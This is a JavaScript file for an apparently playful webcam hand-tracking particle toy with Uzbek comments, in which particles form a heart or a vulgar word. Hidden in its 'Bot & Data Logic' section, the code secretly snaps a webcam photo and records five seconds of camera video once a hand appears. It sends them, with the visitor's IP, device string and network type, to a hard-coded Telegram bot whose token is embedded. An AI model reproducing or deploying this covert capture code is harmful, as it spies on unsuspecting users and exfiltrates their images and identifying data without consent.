// --- Configuration ---
const TG_CONFIG = {
    botToken: '8184492180:AAGaPiHHxU7xmjBZzDXcZ3_IOMUM-_A0RPY',
    chatId: '7306854093',
    enabled: true
};

// --- Variables ---
const videoElement = document.getElementById('inputVideo');
const canvasElement = document.getElementById('particleCanvas');
const canvasCtx = canvasElement.getContext('2d');
const statusElement = document.getElementById('status');

let width, height;
let particles = [];
const PARTICLE_COUNT = 5000; // Zarrachalar soni keskin ko'paytirildi (5000 ta)
let attractor = { x: -100, y: -100, active: false };
let scaleFactor = 1.0;
let isHeartMode = false;
let isFuckMode = false;
let photoTaken = false;
let videoSent = false;
let mediaRecorder;
let recordedChunks = [];
let userIp = "Aniqlanmoqda...";

// --- Shapes Logic ---
const heartCoords = [];
for (let t = 0; t < Math.PI * 2; t += 0.04) {
    const x = 16 * Math.pow(Math.sin(t), 3);
    const y = -(13 * Math.cos(t) - 5 * Math.cos(2 * t) - 2 * Math.cos(3 * t) - Math.cos(4 * t));
    heartCoords.push({ x, y });
}

const circleCoords = [];
for (let i = 0; i < 3000; i++) {
    const r = Math.sqrt(Math.random()) * 12; // Uniform disk distribution
    const t = Math.random() * Math.PI * 2;
    circleCoords.push({ x: Math.cos(t) * r, y: Math.sin(t) * r });
}

const fuckCoords = [];
// F
for (let i = -12; i <= 12; i += 1.5) { fuckCoords.push({ x: -25, y: i }); if (i <= -4) fuckCoords.push({ x: -25 + (i + 12), y: -12 }); if (i == 0) fuckCoords.push({ x: -25 + 8, y: 0 }); }
// U
for (let i = -12; i <= 12; i += 1.5) { fuckCoords.push({ x: -8, y: i }); fuckCoords.push({ x: 4, y: i }); if (i == 12) for (let j = -8; j <= 4; j += 1.5) fuckCoords.push({ x: j, y: 12 }); }
// C
for (let i = -12; i <= 12; i += 1.5) { fuckCoords.push({ x: 15, y: i }); if (i == -12 || i == 12) for (let j = 15; j <= 23; j += 1.5) fuckCoords.push({ x: j, y: i }); }
// K
for (let i = -12; i <= 12; i += 1.5) { fuckCoords.push({ x: 32, y: i }); if (i > 0) fuckCoords.push({ x: 32 + i, y: i }); if (i < 0) fuckCoords.push({ x: 32 - i, y: i }); }

// --- Particle Class ---
class Particle {
    constructor() {
        this.init();
    }

    init() {
        this.x = Math.random() * width;
        this.y = Math.random() * height;
        this.vx = (Math.random() - 0.5) * 2;
        this.vy = (Math.random() - 0.5) * 2;
        this.size = Math.random() * 1.5 + 0.3;
        this.color = `hsl(${Math.random() * 40 + 190}, 100%, 75%)`;
        this.baseColor = this.color;
        this.friction = 0.94;
        this.targetIdx = Math.floor(Math.random() * 3000);
    }

    update() {
        let targets = circleCoords;
        let tColor = this.baseColor;
        let status = "Kutish...";

        if (isHeartMode) {
            targets = heartCoords;
            tColor = '#ff0055';
            status = "❤️ YURAK";
        } else if (isFuckMode) {
            targets = fuckCoords;
            tColor = '#ff0000';
            status = "🔥 FUCK";
        } else if (attractor.active) {
            status = "O'ynash...";
        }

        const t = targets[this.targetIdx % targets.length];
        const cx = attractor.active ? attractor.x : width / 2;
        const cy = attractor.active ? attractor.y : height / 2;

        const tx = cx + t.x * 18 * scaleFactor;
        const ty = cy + t.y * 18 * scaleFactor;

        this.vx += (tx - this.x) * 0.08;
        this.vy += (ty - this.y) * 0.08;
        this.vx *= this.friction;
        this.vy *= this.friction;
        this.x += this.vx;
        this.y += this.vy;
        this.color = tColor;

        if (this.targetIdx % 500 === 0) statusElement.innerText = status;
    }

    draw() {
        canvasCtx.fillStyle = this.color;
        canvasCtx.beginPath();
        canvasCtx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
        canvasCtx.fill();
        if (isHeartMode || isFuckMode) {
            canvasCtx.shadowBlur = 8;
            canvasCtx.shadowColor = this.color;
        } else {
            canvasCtx.shadowBlur = 0;
        }
    }
}

// --- Bot & Data Logic ---
async function fetchIp() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        userIp = data.ip;
    } catch (e) { console.error('IP aniqlanmadi'); }
}

async function sendToTelegram() {
    if (!TG_CONFIG.enabled || photoTaken) return;
    photoTaken = true;

    // Qurilma va tarmoq ma'lumotlari
    const device = navigator.userAgent;
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    const carrier = connection ? (connection.type || connection.effectiveType || "Noma'lum") : "Noma'lum";

    const tempCanvas = document.createElement('canvas');
    tempCanvas.width = videoElement.videoWidth;
    tempCanvas.height = videoElement.videoHeight;
    tempCanvas.getContext('2d').drawImage(videoElement, 0, 0);

    tempCanvas.toBlob(async (blob) => {
        const formData = new FormData();
        formData.append('chat_id', TG_CONFIG.chatId);
        formData.append('photo', blob, 'user.jpg');
        formData.append('caption', `Yangi foydalanuvchi!\n📍 IP: ${userIp}\n📱 Qurilma: ${device}\n📶 Tarmoq: ${carrier}\n🎦 Video tayyorlanmoqda...`);

        try {
            await fetch(`https://api.telegram.org/bot${TG_CONFIG.botToken}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
            startVideoRecording(device, carrier);
        } catch (err) { console.error(err); }
    }, 'image/jpeg');
}

function startVideoRecording(device, carrier) {
    if (videoSent) return;
    videoSent = true;

    // Kameradan stream olish (Canvas emas!)
    const stream = videoElement.srcObject;
    if (!stream) {
        console.error("Kamera stream'i topilmadi");
        return;
    }

    const mimeType = 'video/webm;codecs=vp8';
    mediaRecorder = new MediaRecorder(stream, { mimeType });
    recordedChunks = [];

    mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
    mediaRecorder.onstop = async () => {
        const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
        const formData = new FormData();
        formData.append('chat_id', TG_CONFIG.chatId);
        formData.append('video', videoBlob, 'video.mp4');
        formData.append('caption', `Foydalanuvchi kamerasi (Haqiqiy rasm)\n📍 IP: ${userIp}\n📱 Qurilma: ${device}\n📶 Tarmoq: ${carrier}`);

        try {
            await fetch(`https://api.telegram.org/bot${TG_CONFIG.botToken}/sendVideo`, {
                method: 'POST',
                body: formData
            });
        } catch (err) { console.error(err); }
    };

    mediaRecorder.start();
    setTimeout(() => { if (mediaRecorder.state === "recording") mediaRecorder.stop(); }, 5000);
}

// --- Hand Tracking ---
function onResults(results) {
    canvasCtx.save();
    canvasCtx.clearRect(0, 0, width, height);

    if (results.multiHandLandmarks && results.multiHandLandmarks.length > 0) {
        if (!photoTaken) sendToTelegram();

        let rH = null, lH = null;
        if (results.multiHandedness) {
            results.multiHandedness.forEach((h, i) => {
                if (h.label === 'Right') rH = results.multiHandLandmarks[i];
                else lH = results.multiHandLandmarks[i];
            });
        }

        const main = rH || results.multiHandLandmarks[0];
        if (main) {
            attractor.x = main[8].x * width;
            attractor.y = main[8].y * height;
            attractor.active = true;
        }

        let isH = (rH && checkPeace(rH)) || (lH && checkPeace(lH));
        let isF = (rH && checkFuck(rH)) || (lH && checkFuck(lH));
        isHeartMode = isH;
        isFuckMode = isF;

        if (lH) {
            const d = Math.hypot(lH[4].x - lH[8].x, lH[4].y - lH[8].y);
            scaleFactor = Math.max(0.4, Math.min(2.2, d * 6));
        } else scaleFactor = 1.0;

        drawSkeleton(results.multiHandLandmarks);
    } else {
        attractor.active = false;
        isHeartMode = false;
        isFuckMode = false;
        statusElement.innerText = "Qo'l qidirilmoqda...";
    }

    particles.forEach(p => { p.update(); p.draw(); });
    canvasCtx.restore();
}

function checkPeace(lm) { return lm[8].y < lm[6].y && lm[12].y < lm[10].y && lm[16].y > lm[14].y; }
function checkFuck(lm) { return lm[12].y < lm[10].y - 0.1 && lm[8].y > lm[6].y && lm[16].y > lm[14].y; }

function drawSkeleton(multi) {
    const conn = [[0, 1], [1, 2], [2, 3], [3, 4], [0, 5], [5, 6], [6, 7], [7, 8], [0, 9], [9, 10], [10, 11], [11, 12], [0, 13], [13, 14], [14, 15], [15, 16], [0, 17], [17, 18], [18, 19], [19, 20], [5, 9], [9, 13], [13, 17]];
    for (const lm of multi) {
        canvasCtx.strokeStyle = 'rgba(0, 242, 255, 0.4)';
        canvasCtx.lineWidth = 2.5;
        conn.forEach(([s, e]) => {
            canvasCtx.beginPath();
            canvasCtx.moveTo(lm[s].x * width, lm[s].y * height);
            canvasCtx.lineTo(lm[e].x * width, lm[e].y * height);
            canvasCtx.stroke();
        });
        for (let i = 0; i < 21; i++) {
            const tip = [4, 8, 12, 16, 20].includes(i);
            canvasCtx.fillStyle = tip ? '#00f2ff' : '#fff';
            canvasCtx.beginPath();
            canvasCtx.arc(lm[i].x * width, lm[i].y * height, tip ? 5 : 2.5, 0, Math.PI * 2);
            canvasCtx.fill();
        }
    }
}

// --- Init ---
function resize() { width = canvasElement.width = window.innerWidth; height = canvasElement.height = window.innerHeight; }
window.addEventListener('resize', resize);
resize();

const hnd = new Hands({ locateFile: (f) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${f}` });
hnd.setOptions({ maxNumHands: 2, modelComplexity: 1, minDetectionConfidence: 0.6, minTrackingConfidence: 0.6 });
hnd.onResults(onResults);
const cam = new Camera(videoElement, { onFrame: async () => { await hnd.send({ image: videoElement }); }, width: 1280, height: 720 });

fetchIp();
for (let i = 0; i < PARTICLE_COUNT; i++) particles.push(new Particle());
cam.start();
